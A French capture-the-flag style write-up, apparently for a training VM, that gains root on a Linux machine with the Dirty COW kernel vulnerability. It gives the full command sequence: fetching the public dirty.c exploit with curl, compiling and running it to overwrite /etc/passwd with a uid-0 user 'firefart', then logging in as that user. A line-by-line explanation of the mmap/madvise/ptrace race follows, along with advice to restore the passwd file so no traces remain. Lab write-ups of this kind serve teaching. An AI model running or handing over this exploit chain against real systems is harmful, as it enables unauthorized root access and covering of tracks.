# WRITEUP2

## Pré-requis

Avant de commencer cet _exploit_, vérifiez que ces pré-requis sont
présents :
-   Une machine virtuelle : au choix VMware ou VirtualBox. Nous avons
    préféré VMware.
-   nmap : faites brew install nmap, l’installation prend une dizaine de
    minutes.
-   python 3.x.
-   Reprendre les étapes du `writeup1` jusqu'à la connexion en ssh avec : _laurie_.
-   scp -r -p user@serveur1:chemin/vers/dossier/source user@serveur2:chemin/vers/dossier/destination (envoyer le _script2.sh_ vers _laurie_)

## Le script

Les étapes suivantes sont reprises dans le script2.sh.

Nous téléchargons un script via _curl_ avec l'option _-O_ permettant de rediriger vers un fichier.
Ensuite nous compilons et lançons ce script avec un argument afin de choisir un nouveau mot de passe.

```
$> curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload   Upload  Total   Spent    Left  Speed
100  4815  100  4815    0     0  23803      0 --:--:-- --:--:-- --:--:-- 31266
$> gcc -pthread dirty.c -o dirty -lcrypt
$> ./dirty "petdefeu"
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: petdefeu
Complete line:
firefart:trzgUrWEhLNPY:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'petdefeu'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'petdefeu'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

# Explications

Ce script utilise _l'exploit pokemon_ de la faille _dirtycow_ effective sur le kernel Unix durant 9 ans. Il remplace l'utilisateur `root` par un utilisateur custom.
L'user est invité à rentrer un nouveau mot de passe lors de l'éxecution du binaire ou à le passer en paramètre au moment de l'éxecution.
Le fichier `/etc/passwd` original est sauvegardé dans `/tmp/passswd.bak`; pour ne pas laisser de traces après le passage vous êtes invités à le remettre en place.

Si un fichier `/tmp/passswd.bak` existe déjà, le programme retourne un message d'erreur et s'arrête.
Une structure est initialisée (`username`, `user_id`, `info`, ...).
- Si il y a un second argument alors il est mis en mot de passe.
- Sinon, l'utilisateur est invité à taper son mot de passe.

Le mot de passe est crypté avec la fonction :
```char *crypt(const char *key, const char *salt);```
de la librairie `#include <crypt.h>`

Une chaine de caractères est alors créée contenant la structure complète.
Mmap est utilisé sur `/etc/passwd` avec le file descriptor (ce qui nous permettra ensuite d'écrire en mémoire ET sur le fichier).
La fonction `pid_t  fork(void);` est utilisé afin de créer un nouveau processus.

### Processus parent :

- Nous utilisons `pid_t  waitpid(pid_t pid, int *status, int options);` afin d'attendre le changement d'état du processus fils. `waitpid` suspend l'exécution du processus appelant jusqu'à ce que le fils spécifié par son pid ait changé d'état.
- `long ptrace(enum __ptrace_request requête, pid_t pid, void *addr, void *data);` cette fonction fournit au processus parent un moyen de contrôler l'éxécution d'un autre processus et d'éditer son image mémoire. Avec `PTRACE_POKETEXT` permettant d'écrire le password dans le fichier mappé, elle s'exécute en parralèle du second thread qui notifie au système que le map ne sera pas utilisé bloquant ainsi la vérification des droits (via madvise()).


### Processus enfant :

- `pthread_create` crée un nouveau thread qui exécute `madviseThread()` qui va bloquer l'espace mémoire mappé pendant que l'autre thread le remplit avec le nouvel utilisateur. 
- `madviseThread()` => manager le fonctionnement du système sur l'allocation; `MADV_DONTNEED` ne prévoit pas d'accès futur et donc le système ne vérifie pas les droits lors de l'écriture.
- Utilisation de `ptrace` avec `PTRACE_TRACEME`, permet au processus parent de suivre l'enfant.
- `kill` processus enfant
- `pthread_join` suspends le thread

Le script script2.sh termine en se connectant en `firefart` donc le nouveau _super-user_

```bash
$> su firefart
Password:
``` 

Nous pouvons vérifier que nous avons tous les droits en tapant la commande `id`:

```bash
$> id
uid=0(firefart) gid=0(root) groups=0(root)
```

__Bravo ! Vous êtes root !__
